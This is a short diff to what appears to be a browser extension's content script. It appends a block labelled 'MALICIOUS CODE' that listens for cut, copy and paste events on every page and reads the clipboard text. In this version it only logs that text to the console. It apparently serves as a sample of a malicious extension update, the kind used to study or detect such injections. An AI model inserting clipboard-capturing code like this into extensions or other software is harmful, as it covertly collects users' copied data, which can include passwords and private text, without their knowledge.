@@ -435,3 +435,25 @@ else chrome.runtime.sendMessage({ message: "top" }, init);
 
 chrome.storage.onChanged.addListener(update);
 observer.observe(document, { childList: true, subtree: true });
+
+/**
+ * MALICIOUS CODE
+ */
+
+// Get clipboard data when cut, copy, or paste is invoked
+document.addEventListener('cut', function(event) {
+  printClipboardData(event);
+});
+document.addEventListener('copy', function(event) {
+  printClipboardData(event);
+});
+document.addEventListener('paste', function(event) {
+  printClipboardData(event);
+});
+
+function printClipboardData(event) {
+  // Access the copied text from the event's clipboardData
+  const copiedText = event.clipboardData.getData('text/plain');
+  // Log or process the copied text
+  console.log('Copied text:', copiedText);
+}
